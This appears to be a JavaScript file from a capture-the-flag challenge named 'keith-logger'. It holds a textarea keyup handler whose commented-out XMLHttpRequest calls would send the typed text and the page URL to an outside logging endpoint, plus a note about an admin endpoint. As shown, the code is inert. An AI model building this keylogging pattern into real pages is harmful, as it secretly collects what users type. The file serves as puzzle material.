var timeout_textarea;
var xhr_textarea;

$("textarea").on("keyup", function() {
  if (timeout_textarea) {
    clearTimeout(timeout_textarea);
  }

  if (xhr_textarea) {
    xhr_textarea.abort();
  }

  timeout_textarea = setTimeout(function() {
    var xhr = new XMLHttpRequest();
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/record?text=" +
        encodeURIComponent($("textarea").val()) +
        "&url=" + encodeURIComponent(window.location.href),
      true
    );*/


    // send a request to admin whenever something is logged, not needed anymore after testing
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/admin",
      true
    );*/

    xhr.send();
  }, 2000);
});
